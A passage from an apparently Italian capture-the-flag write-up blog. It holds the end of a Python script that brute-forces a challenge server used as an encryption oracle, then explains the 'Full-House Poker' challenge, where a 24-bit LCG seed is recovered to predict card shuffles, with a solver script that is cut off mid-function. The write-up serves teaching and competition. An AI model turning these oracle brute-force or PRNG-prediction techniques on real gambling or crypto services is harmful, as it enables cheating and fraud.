</span></span><span class="line"><span class="cl">    <span class="n">mappings</span><span class="p">[</span><span class="n">enc_chunk</span><span class="p">]</span> <span class="o">=</span> <span class="n">plain_chunk</span>
</span></span><span class="line"><span class="cl">   
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;28267ab8.ctf.ac.upt.ro&#39;</span><span class="p">,</span> <span class="mi">9323</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">flag_enc</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">flag_enc</span><span class="p">)</span> <span class="o">%</span> <span class="mi">8</span> <span class="o">==</span> <span class="mi">0</span><span class="p">,</span> <span class="s2">&#34;Encrypted flag length should be a multiple of 8&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">decoded_blocks</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">flag_enc</span><span class="p">),</span> <span class="mi">8</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">c</span> <span class="o">=</span> <span class="n">flag_enc</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">8</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">decoded_blocks</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">mappings</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">c</span><span class="p">,</span> <span class="s1">&#39;????&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">flag_dec</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">decoded_blocks</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Flag: </span><span class="si">{</span><span class="n">flag_dec</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;flag.txt&#39;</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">flag_dec</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">tup</span> <span class="ow">in</span> <span class="n">trange</span><span class="p">(</span><span class="mi">255</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">trange</span><span class="p">(</span><span class="mi">255</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="ow">not</span> <span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">.</span><span class="n">isprintable</span><span class="p">():</span> <span class="k">continue</span>
</span></span><span class="line"><span class="cl">        <span class="n">brute</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">tup</span><span class="si">:</span><span class="s2">02x</span><span class="si">}</span><span class="s2">&#34;</span> <span class="o">+</span> <span class="s2">&#34;}&#34;</span> <span class="o">+</span> <span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;28267ab8.ctf.ac.upt.ro&#39;</span><span class="p">,</span> <span class="mi">9323</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span> <span class="n">brute</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="n">output</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">output</span><span class="p">[:</span><span class="mi">8</span><span class="p">]</span> <span class="ow">in</span> <span class="n">flag_enc</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Found matching plaintext: </span><span class="si">{</span><span class="n">brute</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">tup</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="n">output</span><span class="p">[:</span><span class="mi">8</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;No matching 4-byte plaintext found in given alphabet.&#34;</span><span class="p">)</span>
</span></span></code></pre></div><h2 id="varie-">Varie üêß<a hidden class="anchor" aria-hidden="true" href="#varie-">#</a></h2>
<h3 id="full-house-poker">Full-House Poker<a hidden class="anchor" aria-hidden="true" href="#full-house-poker">#</a></h3>
<h4 id="analisi-10">Analisi<a hidden class="anchor" aria-hidden="true" href="#analisi-10">#</a></h4>
<p>Il gioco di poker remoto mescolava il mazzo usando un generatore lineare congruenziale (LCG) non crittografico con seed a 24 bit e Fisher‚ÄìYates. Foldando per alcune mani per raccogliere mani consecutive del giocatore, possiamo recuperare il seed (con una piccola finestra temporale o brute-force 2^24), riprodurre le mescolate future e puntare solo quando la mano prevista batte strettamente quella del dealer. Vincendo 30 volte si ottiene la flag.</p>
<ul>
<li>PRNG: LCG con parametri A=1103515245, C=12345, M=2^31, seed troncato a 24 bit.</li>
<li>Shuffle: Fisher-Yates, avanzando il PRNG una volta per swap (51 estrazioni per round).</li>
<li>Osservazione: Il giocatore riceve le prime 5 carte del mazzo mescolato; il dealer le successive 5.</li>
<li>Attacco: Raccogliere 4 mani consecutive foldando; recuperare il seed; predire i round futuri; puntare solo su vittorie garantite; raggiungere una serie di 30.</li>
</ul>
<h4 id="soluzione-10">Soluzione<a hidden class="anchor" aria-hidden="true" href="#soluzione-10">#</a></h4>
<ol>
<li>Raccolta dati &ndash;&gt; fold:</li>
</ol>
<ul>
<li>Leggere le carte ASCII per 4 round consecutivi (<code>HAND_SAMPLES = 4</code>).</li>
<li>Inviare sempre <code>f</code> (fold) in questa fase. Conserva la serie e garantisce una mescolata per round senza uso extra del PRNG.</li>
</ul>
<ol start="2">
<li>Recupero seed:</li>
</ol>
<ul>
<li>Ricerca a finestra temporale: il seed √® derivato da <code>time.time()</code> modulo 2^24, assumo il timestamp vicino al momento di connessione. Partire da <code>now &amp; 0xFFFFFF</code> e provare raggi di 10m, 1h, 6h, 24h (~600, ~3600, ~21600, ~86400 secondi). Per ogni seed candidato, simulare <code>HAND_SAMPLES</code> mescolate e verificare che le prime 5 carte corrispondano alle mani osservate.</li>
<li>Brute force completa: se fallisce, scandire tutto lo spazio a 24 bit (~16,7M seed). Fattibile in Python efficiente con early-reject.</li>
</ul>
<ol start="3">
<li>Predizione e vittoria:</li>
</ol>
<ul>
<li>
<p>Dopo il recupero del seed, avanzare il PRNG eseguendo <code>HAND_SAMPLES</code> mescolate per sincronizzarsi col round successivo.</p>
</li>
<li>
<p>Per ogni round:</p>
<ul>
<li>Simulare la prossima mescolata ed estrarre le 5 carte del giocatore e del dealer (posizioni 0..4 e 5..9 del mazzo).</li>
<li>Valutare entrambe le mani con lo stesso ranking del server e confrontare.</li>
<li>Puntare solo se la mano del giocatore batte strettamente quella del dealer; altrimenti foldare.</li>
</ul>
</li>
<li>
<p>Ripetere finch√© la serie arriva a 30; il server stampa la flag.</p>
</li>
</ul>
<h4 id="script-9">Script<a hidden class="anchor" aria-hidden="true" href="#script-9">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="n">remote</span><span class="p">,</span> <span class="n">context</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;info&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">HOST</span> <span class="o">=</span> <span class="s1">&#39;?&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">PORT</span> <span class="o">=</span> <span class="err">?</span>
</span></span><span class="line"><span class="cl"><span class="n">MAX_SEED</span> <span class="o">=</span> <span class="mh">0xFFFFFF</span>  <span class="c1"># 24-bit</span>
</span></span><span class="line"><span class="cl"><span class="n">HAND_SAMPLES</span> <span class="o">=</span> <span class="mi">4</span>      <span class="c1"># number of initial hands to collect for seed filtering</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">RANK_ORDER</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;2&#39;</span><span class="p">,</span><span class="s1">&#39;3&#39;</span><span class="p">,</span><span class="s1">&#39;4&#39;</span><span class="p">,</span><span class="s1">&#39;5&#39;</span><span class="p">,</span><span class="s1">&#39;6&#39;</span><span class="p">,</span><span class="s1">&#39;7&#39;</span><span class="p">,</span><span class="s1">&#39;8&#39;</span><span class="p">,</span><span class="s1">&#39;9&#39;</span><span class="p">,</span><span class="s1">&#39;T&#39;</span><span class="p">,</span><span class="s1">&#39;J&#39;</span><span class="p">,</span><span class="s1">&#39;Q&#39;</span><span class="p">,</span><span class="s1">&#39;K&#39;</span><span class="p">,</span><span class="s1">&#39;A&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">SUITS</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;‚ô†&#39;</span><span class="p">,</span><span class="s1">&#39;‚ô•&#39;</span><span class="p">,</span><span class="s1">&#39;‚ô¶&#39;</span><span class="p">,</span><span class="s1">&#39;‚ô£&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">RANK_VALUE</span> <span class="o">=</span> <span class="p">{</span><span class="n">r</span><span class="p">:</span> <span class="n">i</span><span class="o">+</span><span class="mi">2</span> <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">r</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">RANK_ORDER</span><span class="p">)}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Build canonical ordered deck</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">build_deck</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">[(</span><span class="n">r</span><span class="p">,</span><span class="n">s</span><span class="p">)</span> <span class="k">for</span> <span class="n">r</span> <span class="ow">in</span> <span class="n">RANK_ORDER</span> <span class="k">for</span> <span class="n">s</span> <span class="ow">in</span> <span class="n">SUITS</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># LCG parameters (mod 2^31)</span>
</span></span><span class="line"><span class="cl"><span class="n">A</span> <span class="o">=</span> <span class="mi">1103515245</span>
</span></span><span class="line"><span class="cl"><span class="n">C</span> <span class="o">=</span> <span class="mi">12345</span>
</span></span><span class="line"><span class="cl"><span class="n">M</span> <span class="o">=</span> <span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">31</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">lcg_next</span><span class="p">(</span><span class="n">state</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">(</span><span class="n">A</span> <span class="o">*</span> <span class="n">state</span> <span class="o">+</span> <span class="n">C</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0x7fffffff</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Apply Fisher-Yates using LCG state; returns new state after 51 draws and deck</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">shuffle_with_state</span><span class="p">(</span><span class="n">state</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">deck</span> <span class="o">=</span> <span class="n">build_deck</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">deck</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">state</span> <span class="o">=</span> <span class="n">lcg_next</span><span class="p">(</span><span class="n">state</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">j</span> <span class="o">=</span> <span class="n">state</span> <span class="o">%</span> <span class="p">(</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">deck</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">deck</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="n">deck</span><span class="p">[</span><span class="n">j</span><span class="p">],</span> <span class="n">deck</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">state</span><span class="p">,</span> <span class="n">deck</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Hand evaluation (same tuples ordering as server)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">hand_strength</span><span class="p">(</span><span class="n">cards</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">ranks</span> <span class="o">=</span> <span class="nb">sorted</span><span class="p">([</span><span class="n">RANK_VALUE</span><span class="p">[</span><span class="n">r</span><span class="p">]</span> <span class="k">for</span> <span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">s</span><span class="p">)</span> <span class="ow">in</span> <span class="n">cards</span><span class="p">],</span> <span class="n">reverse</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">suits</span> <span class="o">=</span> <span class="p">[</span><span class="n">s</span> <span class="k">for</span> <span class="p">(</span><span class="n">r</span><span class="p">,</span><span class="n">s</span><span class="p">)</span> <span class="ow">in</span> <span class="n">cards</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">counts</span> <span class="o">=</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">rv</span> <span class="ow">in</span> <span class="n">ranks</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">counts</span><span class="p">[</span><span class="n">rv</span><span class="p">]</span> <span class="o">=</span> <span class="n">counts</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">rv</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span>
</span></span><span class="line"><span class="cl">    <span class="n">by_count_then_rank</span> <span class="o">=</span> <span class="nb">sorted</span><span class="p">(</span><span class="n">counts</span><span class="o">.</span><span class="n">items</span><span class="p">(),</span> <span class="n">key</span><span class="o">=</span><span class="k">lambda</span> <span class="n">kv</span><span class="p">:</span> <span class="p">(</span><span class="n">kv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">kv</span><span class="p">[</span><span class="mi">0</span><span class="p">]),</span> <span class="n">reverse</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">is_flush</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="nb">set</span><span class="p">(</span><span class="n">suits</span><span class="p">))</span> <span class="o">==</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">    <span class="n">sorted_unique_desc</span> <span class="o">=</span> <span class="nb">sorted</span><span class="p">(</span><span class="nb">set</span><span class="p">(</span><span class="n">ranks</span><span class="p">),</span> <span class="n">reverse</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">is_straight</span> <span class="o">=</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">    <span class="n">straight_high</span> <span class="o">=</span> <span class="kc">None</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sorted_unique_desc</span><span class="p">)</span> <span class="o">==</span> <span class="mi">5</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">top</span> <span class="o">=</span> <span class="n">sorted_unique_desc</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">sorted_unique_desc</span> <span class="o">==</span> <span class="nb">list</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="n">top</span><span class="p">,</span> <span class="n">top</span><span class="o">-</span><span class="mi">5</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">)):</span>
</span></span><span class="line"><span class="cl">            <span class="n">is_straight</span> <span class="o">=</span> <span class="kc">True</span>
</span></span><span class="line"><span class="cl">            <span class="n">straight_high</span> <span class="o">=</span> <span class="n">top</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">wheel</span> <span class="o">=</span> <span class="p">[</span><span class="mi">14</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">2</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">sorted_unique_desc</span> <span class="o">==</span> <span class="n">wheel</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">is_straight</span> <span class="o">=</span> <span class="kc">True</span>
</span></span><span class="line"><span class="cl">                <span class="n">straight_high</span> <span class="o">=</span> <span class="mi">5</span>
</span></span><span class="line"><span class="cl">    <span class="n">counts_sorted</span> <span class="o">=</span> <span class="p">[</span><span class="n">c</span> <span class="k">for</span> <span class="p">(</span><span class="n">_</span><span class="p">,</span><span class="n">c</span><span class="p">)</span> <span class="ow">in</span> <span class="n">by_count_then_rank</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">ranks_sorted_by_count</span> <span class="o">=</span> <span class="p">[</span><span class="n">r</span> <span class="k">for</span> <span class="p">(</span><span class="n">r</span><span class="p">,</span><span class="n">_</span><span class="p">)</span> <span class="ow">in</span> <span class="n">by_count_then_rank</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">counts_sorted</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="mi">4</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="n">ranks_sorted_by_count</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">ranks_sorted_by_count</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">counts_sorted</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="mi">3</span> <span class="ow">and</span> <span class="n">counts_sorted</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="mi">2</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="n">ranks_sorted_by_count</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">ranks_sorted_by_count</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">is_flush</span> <span class="ow">and</span> <span class="n">is_straight</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="n">straight_high</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">is_flush</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="nb">sorted</span><span class="p">(</span><span class="n">ranks</span><span class="p">,</span> <span class="n">reverse</span><span class="o">=</span><span class="kc">True</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">is_straight</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="n">straight_high</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">counts_sorted</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="mi">3</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">trips_rank</span> <span class="o">=</span> <span class="n">ranks_sorted_by_count</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="n">kickers</span> <span class="o">=</span> <span class="nb">sorted</span><span class="p">([</span><span class="n">r</span> <span class="k">for</span> <span class="n">r</span> <span class="ow">in</span> <span class="n">ranks</span> <span class="k">if</span> <span class="n">r</span> <span class="o">!=</span> <span class="n">trips_rank</span><span class="p">],</span> <span class="n">reverse</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="n">trips_rank</span><span class="p">,</span> <span class="n">kickers</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">counts_sorted</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="mi">2</span> <span class="ow">and</span> <span class="n">counts_sorted</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="mi">2</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">high_pair</span> <span class="o">=</span> <span class="nb">max</span><span class="p">(</span><span class="n">ranks_sorted_by_count</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">ranks_sorted_by_count</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">        <span class="n">low_pair</span> <span class="o">=</span> <span class="nb">min</span><span class="p">(</span><span class="n">ranks_sorted_by_count</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">ranks_sorted_by_count</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">        <span class="n">kicker</span> <span class="o">=</span> <span class="p">[</span><span class="n">r</span> <span class="k">for</span> <span class="n">r</span> <span class="ow">in</span> <span class="n">ranks</span> <span class="k">if</span> <span class="n">r</span> <span class="o">!=</span> <span class="n">high_pair</span> <span class="ow">and</span> <span class="n">r</span> <span class="o">!=</span> <span class="n">low_pair</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">high_pair</span><span class="p">,</span> <span class="n">low_pair</span><span class="p">,</span> <span class="n">kicker</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">counts_sorted</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="mi">2</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">pair_rank</span> <span class="o">=</span> <span class="n">ranks_sorted_by_count</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="n">kickers</span> <span class="o">=</span> <span class="nb">sorted</span><span class="p">([</span><span class="n">r</span> <span class="k">for</span> <span class="n">r</span> <span class="ow">in</span> <span class="n">ranks</span> <span class="k">if</span> <span class="n">r</span> <span class="o">!=</span> <span class="n">pair_rank</span><span class="p">],</span> <span class="n">reverse</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">pair_rank</span><span class="p">,</span> <span class="n">kickers</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">sorted</span><span class="p">(</span><span class="n">ranks</span><span class="p">,</span> <span class="n">reverse</span><span class="o">=</span><span class="kc">True</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">compare_hands</span><span class="p">(</span><span class="n">p1</span><span class="p">,</span> <span class="n">p2</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">s1</span> <span class="o">=</span> <span class="n">hand_strength</span><span class="p">(</span><span class="n">p1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">s2</span> <span class="o">=</span> <span class="n">hand_strength</span><span class="p">(</span><span class="n">p2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">(</span><span class="n">s1</span> <span class="o">&gt;</span> <span class="n">s2</span><span class="p">)</span> <span class="o">-</span> <span class="p">(</span><span class="n">s1</span> <span class="o">&lt;</span> <span class="n">s2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">CARD_WIDTH</span> <span class="o">=</span> <span class="mi">7</span>
</span></span><span class="line"><span class="cl"><span class="n">CARD_LINES</span> <span class="o">=</span> <span class="mi">7</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">parse_hand</span><span class="p">(</span><span class="n">block</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">lines</span> <span class="o">=</span> <span class="n">block</span><span class="o">.</span><span class="n">strip</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># Expect 7 lines of cards</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">lines</span><span class="p">)</span> <span class="o">&lt;</span> <span class="n">CARD_LINES</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">raise</span> <span class="ne">ValueError</span><span class="p">(</span><span class="s1">&#39;Unexpected hand block lines&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">line1</span> <span class="o">=</span> <span class="n">lines</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>  <span class="c1"># second line (index 1)</span>
